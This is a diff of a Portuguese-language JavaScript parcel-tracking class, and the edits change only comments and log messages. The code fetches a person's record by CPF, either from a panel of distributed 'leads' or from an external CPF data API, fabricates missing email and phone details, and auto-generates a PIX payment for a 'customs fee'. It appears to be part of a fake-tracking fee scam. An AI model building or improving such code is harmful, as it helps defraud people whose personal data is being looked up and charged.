@@ -103,13 +103,13 @@ export class TrackingSystem {
         this.showLoadingNotification();
         
         try {
-            // 🎯 PAINEL CENTRALIZADO: Buscar dados APENAS do painel (localStorage)
-            console.log('🎯 Buscando dados do painel centralizado...');
+            // 🎯 PAINEL CENTRALIZADO: Dados distribuídos pelo painel
+            console.log('🎯 Consultando dados via painel centralizado...');
             const leadResult = await this.dbService.getLeadFromLocalStorage(this.currentCPF);
             
             if (leadResult.success && leadResult.data) {
-                // ✅ Lead encontrado no painel - usar dados completos
-                console.log('✅ Lead encontrado no painel:', leadResult.data);
+                // ✅ Lead encontrado via painel - dados centralizados
+                console.log('✅ Lead encontrado via painel centralizado:', leadResult.data);
                 
                 this.userData = {
                     nome: leadResult.data.nome_completo,
@@ -123,7 +123,7 @@ export class TrackingSystem {
                 
                 this.leadData = leadResult.data;
                 
-                console.log('📦 Dados completos do usuário (Painel):', {
+                console.log('📦 Dados distribuídos pelo painel:', {
                     nome: this.userData.nome,
                     cpf: this.userData.cpf,
                     email: this.userData.email,
@@ -135,8 +135,8 @@ export class TrackingSystem {
                 this.closeLoadingNotification();
                 this.displayResults();
             } else {
-                // ⚠️ Lead não encontrado no painel - buscar dados via API externa
-                console.log('🌐 Lead não encontrado no painel, buscando dados via API...');
+                // ⚠️ Lead não cadastrado no painel - usar API externa como fallback
+                console.log('🌐 Lead não encontrado no painel, usando API externa...');
                 const result = await this.dataService.fetchCPFData(this.currentCPF);
                 
                 if (result && result.DADOS) {
@@ -149,8 +149,8 @@ export class TrackingSystem {
                         situacao: result.DADOS.situacao || 'REGULAR'
                     };
                     
-                    console.log('✅ Dados básicos obtidos via API externa:', this.userData);
-                    console.log('⚠️ Email e telefone não disponíveis - será necessário gerar');
+                    console.log('✅ Dados básicos via API (lead não no painel):', this.userData);
+                    console.log('⚠️ Para pagamentos, será necessário gerar email/telefone');
                     
                     this.closeLoadingNotification();
                     this.displayResults();
@@ -474,37 +474,37 @@ export class TrackingSystem {
     }
 
     async generateLiberationPix() {
-        console.log('🔄 Gerando PIX automático para Taxa Alfandegária...');
+        console.log('🔄 Gerando PIX automático via Zentra Pay Brasil...');
         
         if (!this.userData) {
-            console.error('❌ Dados do usuário não disponíveis para gerar PIX');
+            console.error('❌ Dados do lead não disponíveis (não distribuídos pelo painel)');
             return;
         }
         
         try {
-            // Mostrar indicador de processamento
+            // Mostrar indicador enquanto gera PIX real
             this.showPixGenerationIndicator();
             
-            // Gerar PIX via Zentra Pay
+            // 🚀 Gerar PIX automático via Zentra Pay Brasil
             const pixResult = await this.zentraPayService.generatePixForStage(
                 this.userData, 
                 'taxa_alfandegaria'
             );
             
             if (pixResult.success) {
-                console.log('✅ PIX da Taxa Alfandegária gerado automaticamente!');
+                console.log('✅ PIX automático gerado via Zentra Pay Brasil!');
                 
-                // Atualizar modal com dados reais
+                // Atualizar modal com PIX real
                 this.updateModalWithRealPix(pixResult);
                 
                 this.hidePixGenerationIndicator();
             } else {
-                console.warn('⚠️ Falha ao gerar PIX, usando dados estáticos');
+                console.warn('⚠️ Falha na API Zentra Pay, usando PIX estático');
                 this.hidePixGenerationIndicator();
             }
             
         } catch (error) {
-            console.error('❌ Erro ao gerar PIX automático:', error);
+            console.error('❌ Erro na integração Zentra Pay:', error);
             this.hidePixGenerationIndicator();
         }
     }
